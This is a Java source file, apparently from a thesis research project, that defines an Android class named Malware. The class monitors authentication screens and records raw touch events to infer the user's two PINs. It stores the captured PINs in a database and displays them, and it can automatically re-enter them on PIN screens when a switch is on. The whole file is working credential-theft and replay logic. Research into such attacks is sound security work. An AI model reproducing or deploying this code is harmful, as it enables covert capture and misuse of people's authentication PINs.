package com.example.thesis;

import android.app.Activity;
import android.content.Context;
import android.database.sqlite.SQLiteConstraintException;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.widget.CompoundButton;
import android.widget.Switch;
import android.widget.TextView;

import com.example.thesis.Events.Event;
import com.example.thesis.Events.EventReader;

import java.util.LinkedList;
import java.util.Queue;

/**
 * This is the malware part of the app.
 */
public class Malware implements Runnable {
    final private EventReader eventReader;

    private DisplayedScreenService displayedScreenService;

    private boolean doStop = false;
    private boolean eventReaderRunning = false;

    private Queue<Integer> PIN1;
    private Queue<Integer> PIN2;

    private DisplayedScreen whichPINscreen = DisplayedScreen.OTHER;

    private boolean autoEnterPIN = false;

    private Context context;
    private Activity activity;
    private DatabaseService database;


    public Malware(Context context, Activity activity, DatabaseService database) {
        this.context = context;
        this.activity = activity;
        this.database = database;

        this.eventReader = new EventReader();

        String PIN1_string = database.getPIN(1);
        this.PIN1 = PIN1_string != null ? pinStringToQueue(PIN1_string) : new LinkedList<Integer>();

        String PIN2_string = database.getPIN(2);
        this.PIN2 = PIN2_string != null ? pinStringToQueue(PIN2_string) : new LinkedList<Integer>();

        Switch switchAutoSend = (Switch) activity.findViewById(R.id.switchAutoSend);
        switchAutoSend.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                Log.i("Malware", "Auto entering PIN is now active!");
                autoEnterPIN = isChecked;
            }
        });
    }

    public String getPIN1() {
        return pinToString(PIN1);
    }

    public String getPIN2() {
        return pinToString(PIN2);
    }


    public synchronized void doStop() {
        this.doStop = true;
        this.eventReader.doStop();
        this.displayedScreenService.doStop();
        Log.i("Malware", "Stopped malware!");
    }


    private synchronized boolean keepRunning() {
        return !this.doStop;
    }


    @Override
    public void run() {
        Log.i("Malware", "Started malware!");
        displayedScreenService = new DisplayedScreenService();

        while (keepRunning()) {
            DisplayedScreen currentScreen = displayedScreenService.getCurrentScreen();
            if (!autoEnterPIN) {
                // Recording events to get PIN.
                if (DisplayedScreen.OTHER != currentScreen) {
                    if (!eventReaderRunning) {
                        startListeningEvents();
                    }
                    malwareCode(currentScreen);
                } else if (eventReaderRunning) {
                    stopListeningEvents();
                }
            } else if (!PIN1.isEmpty()) { // && !PIN2.isEmpty()) {
                // Auto sending the PIN.
                if (currentScreen == DisplayedScreen.AUTH_PIN_1) {
                    displayedScreenService.sendPIN(PIN1);
                } else if (currentScreen == DisplayedScreen.AUTH_PIN_2) {
                    displayedScreenService.sendPIN(PIN2);
                }
            } else {
                // Somehow auto enter pin is enabled when not knowing the PIN's, make it impossible.
                Log.e("Malware", "Auto enter pin is active, but don't know PIN(s).");
            }

            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                Log.i("Malware", "Run loop interrupted!");
            }
        }
    }


    private void malwareCode(DisplayedScreen currentScreen) {
        if (currentScreen == DisplayedScreen.AUTH_PIN_1) {
            whichPINscreen = DisplayedScreen.AUTH_PIN_1;
        } else if (currentScreen == DisplayedScreen.AUTH_PIN_2) {
            whichPINscreen = DisplayedScreen.AUTH_PIN_2;
        } else if (currentScreen == DisplayedScreen.AUTH_SUCCESS) {
            if (whichPINscreen == DisplayedScreen.AUTH_PIN_1) {
                setPIN1();
            } else if (whichPINscreen == DisplayedScreen.AUTH_PIN_2) {
                setPIN2();
            }
        } else if (currentScreen == DisplayedScreen.AUTH_FAILED) {
            extractPIN();
        }
    }


    private void startListeningEvents() {
        eventReader.doStart();
        Thread eventReaderThread = new Thread(eventReader, "EventReader Thread");
        eventReaderThread.start();
        eventReaderRunning = true;
    }


    private void stopListeningEvents() {
        eventReader.doStop();
        eventReaderRunning = false;
    }


    /**
     * Empties touchevents also.
     * @return
     */
    private Queue<Integer> extractPIN() {
        Queue<Event> touchEvents = eventReader.getTouchEvents();
        return displayedScreenService.extractPIN(touchEvents);
    }


    private void setPIN1() {
        PIN1 = extractPIN();
        setPIN(1, R.id.textPIN1);
    }


    private void setPIN2() {
        PIN2 = extractPIN();
        setPIN(2, R.id.textPIN2);
    }


    private void setPIN(int id, int textView_id) {
        String PIN_string = pinToString(id == 1 ? PIN1 : PIN2);
        saveToDatabase(id, PIN_string);
        updateView(PIN_string, textView_id, id);
        Log.i("Malware", "Captured PIN " + id + " " + PIN_string);
    }


    public void updateView(String PIN_string, int textView_id, int id) {
        final String PIN_string_final = PIN_string;
        final int id_final = id;
        final int textView_id_final = textView_id;


        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            public void run() {
                TextView textView = (TextView) activity.findViewById(textView_id_final);
                textView.setText("PIN " + id_final + ": " + PIN_string_final);
            }
        });


    }


    private String pinToString(Queue<Integer> PIN) {
        Queue<Integer> PIN1_copy = new LinkedList<>(PIN);
        StringBuilder sb = new StringBuilder();
        while(!PIN1_copy.isEmpty()) {
            sb.append(PIN1_copy.poll());
        }
        return sb.toString();
    }


    private void saveToDatabase(int id, String value){
        database.insertData(id, value);
    }


    private Queue<Integer> pinStringToQueue(String PIN_string) {
        Queue<Integer> PIN_queue = new LinkedList<>();
        if (PIN_string.equals("")) {
            return PIN_queue;
        }

        String[] PIN_array = PIN_string.trim().split("");
        for (int i = 0; i < PIN_array.length; i++) {
            if (!PIN_array[i].equals("")) {
                PIN_queue.add(Integer.parseInt(PIN_array[i]));
            }
        }
        return PIN_queue;
    }



}



